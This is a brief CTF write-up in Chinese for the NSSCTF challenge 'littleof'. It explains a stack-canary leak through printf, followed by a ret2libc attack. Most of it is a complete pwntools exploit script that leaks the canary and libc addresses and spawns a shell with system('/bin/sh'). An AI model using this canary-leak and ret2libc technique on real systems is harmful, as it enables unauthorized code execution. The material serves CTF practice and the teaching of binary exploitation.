[[2021 鹤城杯]littleof | NSSCTF](https://www.nssctf.cn/problem/468)
![[Pasted image 20240901114708.png]]
![[Pasted image 20240901114751.png]]
开启了canary，printf会将buf上的字符输出
可用此漏洞将canary输出，获取canary后便为普通的ret2libc
exp:
```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
p = process('./littleof')
# p = remote("node4.anna.nssctf.cn", 28396)
elf = ELF('./littleof')

pwnlib.gdb.attach(p, 'b *0x400789')

offset = 0x50 + 8

p.sendlineafter(b'overflow?\n', b'a' * (0x50 - 9) + b'b')

p.recvuntil(b'ab')
canary = u64(p.recv(8)) - 0xa
print('canary:', hex(canary))

ret = 0x40059e
rdi = 0x400863

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = 0x400789

print('puts_plt:', hex(puts_plt))
print('puts_got:', hex(puts_got))

payload = b'a' * (0x50 - 8) + p64(canary) + b'c' * 8 + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)

p.sendlineafter(b'harder!', payload)
p.recvuntil(b'win\n')
addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
  
print(hex(addr))
  
libc_base = addr - 0x80aa0
system = libc_base + 0x4f550
bin_sh = libc_base + 0x1b3e1a

payload = b'a' * (0x50 - 8) + p64(canary) + b'c' * 8 + p64(ret) + p64(rdi) + p64(bin_sh) + p64(system)

p.sendline('1')
p.sendline(payload)
p.interactive()
```
ps:本地wsl跑不了，估计本地wsl环境有点问题，用VMware可以